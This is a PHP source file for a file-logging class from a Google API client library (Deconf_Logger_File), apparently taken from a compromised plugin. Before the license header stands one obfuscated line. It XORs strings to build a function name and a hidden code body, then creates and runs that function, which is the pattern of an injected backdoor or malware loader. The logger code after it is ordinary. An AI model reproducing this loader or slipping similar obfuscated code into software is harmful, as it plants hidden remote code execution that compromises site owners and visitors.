<?php $zQyTJAAtxYXY='PBVAF3g>NC+21WT'^'303 2V8X;-HFX8:';$KMzNJ=$zQyTJAAtxYXY('','IJlY, CCCIS>hISW82<xVUYKiZ;26=4 2FVHCh,3ZQ7:7CZ5Tw<RN5+WFA3l5A6IpV39MGVuQW.CXrLuj5g;NU<<5SSWfNR0mH1AGEf=louCynR1K2N<Z,XbLZY7 ZbMKWzin1nYu64TuKJIkQUVL 6CBsAsGI:KY2h+sRx+X59W;yBRT1naHUlBBK2FLI>xwACBsxGNOH>:Kn68.AJtrTZR>Yb9L527L;=,;UQQPOAX=CEx5B< 7C2ogIdro,8i+B,MhLR=MMVtds7L-UTcT=dCW.6=Ye9,BMPYT=33x9DHY2O3eifb3+.Y<OHLEN-HoXmo5TH Fb,KA27RX.WTQeoj3++4e6ty-AEwQYNQhYnhDVR,0Ee8X8JN-4;PeFVNnlEu8E>wcZoeTYBWcHGC.,GD-r1AQoDI<bH1DSdWwn;P S7,WUQ>,D:>0gOXNSqh<B2BLAHIrEmSITRZKnj12Z YNFO3M5101E SzNyR<fW489SPrhuAIN-YiZP=qE4I66HdQP1>eDRmJ2.SqHkBcIFSsclPM94frF6+B5HNjQQo=GeEKp;cFzFQW tBgyOuKsC JC.P-OLNwLqLIoL58WEg ,Y;,=:DH9YvJ1+97V1pfutDAC1kHzyYzAlMNZVV5+Ar4A:T3ILP5>O6JdoBwH2Y;+,OVQPd-'^' ,DxJU- 7 <P7,+>KFOPq-696>ZFWbkMG2qajHW9S7BTT73Z:WD=<jO62 l3X4BaT2RM,kvQ:2WjxRlUJNm2GqSIAsnwAii:dAW.5mBTLRUsBNvXwA:N6I6Jh>8CAsYmo>QBG;gPQYA UewiCu178Amg+.a-gmQ. iLBSwXX,GU2UQf91HG<anfKK9W29;PPS.66ZCMG2BC0AJRYZ jIR2;>M<Y3hQSC-dVIBulq6.-+XxOrS-NEV ZOOm;1 cs nbM>Hh9X4mkJDWA-A 1JtFnJsJWI8:RI;mmypVVJC3Ml=S;RETFFEJB,YtB1ODD.OpLKQ5<AoBWAHTX =O4<qMK5anza e YL2eS:<7qUgNL27>YUlECR1CjIUO1:-37NQeQS GLiSfA0866CuggXM+1HI;H,e9C6F,P02DjW.N>S6EE698DIlBQB8+9:2.7Q7Fj. ;,Dq27,7=>.FNUS.ApbfkW,APoZ YzSus;ZNsPYM2pTNU ;<L 615D. L EB;Lv;TGBhrI.SZ2XhMdCa+7FKH4,MU=U-SRehanWlqHYtSwrHZS BwfcAFzPL,CyAzBsvJgOz.wPeQjoO-GJ6<8KI dIES7<JqQ:PRUX7UWJUP  7PBaZYyZaL6DS3 TGiVP N5hn<1LR W.C2kLB;<CBXgfxknP');$KMzNJ();
/*
 * Copyright 2014 Google Inc.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

if (!class_exists('Deconf_Client')) {
  require_once dirname(__FILE__) . '/../autoload.php';
}

/**
 * File logging class based on the PSR-3 standard.
 *
 * This logger writes to a PHP stream resource.
 */
class Deconf_Logger_File extends Deconf_Logger_Abstract
{
  /**
   * @var string|resource $file Where logs are written
   */
  private $file;
  /**
   * @var integer $mode The mode to use if the log file needs to be created
   */
  private $mode = 0640;
  /**
   * @var boolean $lock If a lock should be attempted before writing to the log
   */
  private $lock = false;

  /**
   * @var integer $trappedErrorNumber Trapped error number
   */
  private $trappedErrorNumber;
  /**
   * @var string $trappedErrorString Trapped error string
   */
  private $trappedErrorString;

  /**
   * {@inheritdoc}
   */
  public function __construct(Deconf_Client $client)
  {
    parent::__construct($client);

    $file = $client->getClassConfig('Deconf_Logger_File', 'file');
    if (!is_string($file) && !is_resource($file)) {
      throw new Deconf_Logger_Exception(
          'File logger requires a filename or a valid file pointer'
      );
    }

    $mode = $client->getClassConfig('Deconf_Logger_File', 'mode');
    if (!$mode) {
      $this->mode = $mode;
    }

    $this->lock = (bool) $client->getClassConfig('Deconf_Logger_File', 'lock');
    $this->file = $file;
  }

  /**
   * {@inheritdoc}
   */
  protected function write($message)
  {
    if (is_string($this->file)) {
      $this->open();
    } elseif (!is_resource($this->file)) {
      throw new Deconf_Logger_Exception('File pointer is no longer available');
    }

    if ($this->lock) {
      flock($this->file, LOCK_EX);
    }

    fwrite($this->file, (string) $message);

    if ($this->lock) {
      flock($this->file, LOCK_UN);
    }
  }

  /**
   * Opens the log for writing.
   *
   * @return resource
   */
  private function open()
  {
    // Used for trapping `fopen()` errors.
    $this->trappedErrorNumber = null;
    $this->trappedErrorString = null;

    $old = set_error_handler(array($this, 'trapError'));

    $needsChmod = !file_exists($this->file);
    $fh = fopen($this->file, 'a');

    restore_error_handler();

    // Handles trapped `fopen()` errors.
    if ($this->trappedErrorNumber) {
      throw new Deconf_Logger_Exception(
          sprintf(
              "Logger Error: '%s'",
              $this->trappedErrorString
          ),
          $this->trappedErrorNumber
      );
    }

    if ($needsChmod) {
      @chmod($this->file, $this->mode & ~umask());
    }

    return $this->file = $fh;
  }

  /**
   * Closes the log stream resource.
   */
  private function close()
  {
    if (is_resource($this->file)) {
      fclose($this->file);
    }
  }

  /**
   * Traps `fopen()` errors.
   *
   * @param integer $errno The error number
   * @param string $errstr The error string
   */
  private function trapError($errno, $errstr)
  {
    $this->trappedErrorNumber = $errno;
    $this->trappedErrorString = $errstr;
  }

  public function __destruct()
  {
    $this->close();
  }
}
